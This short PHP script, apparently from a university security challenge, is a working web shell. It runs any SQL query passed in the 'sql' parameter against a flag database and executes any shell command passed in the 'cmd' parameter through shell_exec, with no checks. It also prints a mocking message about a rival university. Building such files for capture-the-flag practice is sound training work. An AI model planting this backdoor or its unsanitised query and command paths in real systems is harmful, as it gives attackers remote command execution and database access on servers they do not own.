<?php

// originally written for a TUM security challenge by a THI student ;)

if(isset($_GET["sql"])) {
	$db = new SQLite3("/var/www/html/db/flag.db");
	$result = $db->query($_GET["sql"]);
	while($row = $result->fetchArray())
		var_dump($row);
}
else if(isset($_GET["cmd"])) {
	echo(shell_exec($_GET["cmd"]));
}
else {
	echo("lol TUM sucks. gtfo and start studying at THI");
}
